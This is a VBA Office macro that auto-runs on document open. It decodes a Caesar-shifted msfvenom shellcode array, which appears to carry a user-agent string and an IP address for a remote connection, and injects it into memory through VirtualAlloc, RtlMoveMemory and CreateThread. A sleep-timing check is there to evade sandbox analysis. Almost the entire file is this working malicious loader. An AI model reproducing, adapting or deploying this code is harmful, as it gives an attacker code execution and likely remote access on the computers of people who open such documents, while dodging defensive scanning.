//Caesar encrypted shellcode + sleep timer 

Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long

    //time-lapse sleeper  
    t1 = Now()
    Sleep (2000)
    t2 = Now()
    time = DateDiff("s", t1, t2)

    If time < 2 Then
        Exit Function
    End If

    //msfvenom encrypted shellcode 
    buf = Array(254, 234, 145, 2, 2, 2, 98, 139, 231, 51, 212, 102, 141, 84, 50, 141, 84, 14, 141, 84, 22, 51, 1, 17, 185, 76, 40, 141, 116, 42, 51, 194, 174, 62, 99, 126, 4, 46, 34, 195, 209, 15, 3, 201, 75, 119, 241, 84, 89, 141, _
84, 18, 141, 68, 62, 3, 210, 141, 66, 122, 135, 194, 118, 78, 3, 210, 141, 74, 26, 82, 141, 90, 34, 3, 213, 135, 203, 118, 62, 51, 1, 75, 141, 54, 141, 3, 216, 51, 194, 174, 195, 209, 15, 3, 201, 58, 226, 119, 246, 5, _
127, 250, 61, 127, 38, 119, 226, 90, 141, 90, 38, 3, 213, 104, 141, 14, 77, 141, 90, 30, 3, 213, 141, 6, 141, 3, 210, 139, 70, 38, 38, 93, 93, 99, 91, 92, 83, 1, 226, 90, 97, 92, 141, 20, 235, 130, 1, 1, 1, 95, _
106, 112, 103, 118, 2, 106, 121, 107, 112, 107, 86, 106, 78, 121, 40, 9, 1, 215, 51, 221, 85, 85, 85, 85, 85, 234, 129, 2, 2, 2, 79, 113, 124, 107, 110, 110, 99, 49, 55, 48, 50, 34, 42, 107, 82, 99, 102, 61, 34, 69, _
82, 87, 34, 81, 85, 34, 51, 56, 97, 52, 34, 110, 107, 109, 103, 34, 79, 99, 101, 34, 81, 85, 34, 90, 43, 34, 67, 114, 114, 110, 103, 89, 103, 100, 77, 107, 118, 49, 56, 50, 55, 48, 51, 48, 51, 55, 34, 42, 77, 74, _
86, 79, 78, 46, 34, 110, 107, 109, 103, 34, 73, 103, 101, 109, 113, 43, 34, 88, 103, 116, 117, 107, 113, 112, 49, 51, 56, 48, 51, 34, 79, 113, 100, 107, 110, 103, 49, 51, 55, 71, 51, 54, 58, 34, 85, 99, 104, 99, 116, 107, _
49, 56, 50, 54, 48, 51, 2, 106, 60, 88, 123, 169, 1, 215, 85, 85, 108, 5, 85, 85, 106, 189, 3, 2, 2, 234, 60, 3, 2, 2, 49, 109, 51, 57, 92, 102, 74, 105, 89, 124, 72, 84, 67, 71, 87, 71, 83, 76, 81, 73, _
105, 70, 105, 102, 71, 104, 68, 69, 99, 56, 56, 57, 47, 103, 123, 89, 81, 52, 92, 59, 86, 56, 106, 68, 51, 85, 119, 69, 50, 112, 76, 52, 122, 67, 77, 78, 104, 55, 119, 77, 47, 68, 109, 110, 122, 114, 112, 76, 124, 55, _
104, 56, 105, 78, 104, 107, 78, 79, 55, 80, 122, 73, 86, 84, 119, 51, 110, 114, 113, 104, 90, 67, 68, 117, 72, 52, 50, 111, 72, 78, 80, 106, 109, 74, 117, 100, 115, 74, 88, 100, 52, 103, 88, 92, 118, 103, 52, 111, 103, 87, _
57, 101, 80, 58, 70, 75, 55, 122, 118, 47, 67, 118, 91, 99, 119, 54, 85, 119, 80, 78, 84, 88, 50, 56, 108, 103, 84, 68, 89, 119, 123, 52, 90, 73, 113, 75, 56, 100, 120, 73, 84, 83, 73, 89, 114, 77, 71, 122, 113, 54, _
2, 82, 106, 89, 139, 161, 200, 1, 215, 139, 200, 85, 106, 2, 52, 234, 134, 85, 85, 85, 89, 85, 88, 106, 237, 87, 48, 61, 1, 215, 152, 108, 12, 97, 106, 130, 53, 2, 2, 139, 226, 108, 6, 82, 108, 33, 88, 106, 119, 72, _
160, 136, 1, 215, 85, 85, 85, 85, 88, 106, 47, 8, 26, 125, 1, 215, 135, 194, 119, 22, 106, 138, 21, 2, 2, 106, 70, 242, 55, 226, 1, 215, 81, 119, 207, 234, 77, 2, 2, 2, 108, 66, 106, 2, 18, 2, 2, 106, 2, 2, _
66, 2, 85, 106, 90, 166, 85, 231, 1, 215, 149, 85, 85, 139, 233, 89, 106, 2, 34, 2, 2, 85, 88, 106, 20, 152, 139, 228, 1, 215, 135, 194, 118, 209, 141, 9, 3, 197, 135, 194, 119, 231, 90, 197, 97, 234, 109, 1, 1, 1, _
51, 59, 52, 48, 51, 56, 58, 48, 54, 55, 48, 52, 50, 51, 2, 189, 226, 31, 44, 12, 106, 168, 151, 191, 159, 1, 215, 62, 8, 126, 12, 130, 253, 226, 119, 7, 189, 73, 21, 116, 113, 108, 2, 85, 1, 215)

    //decryption routine 
    For i = 0 To UBound(buf)
        buf(i) = buf(i) - 2
    Next i

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function 

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
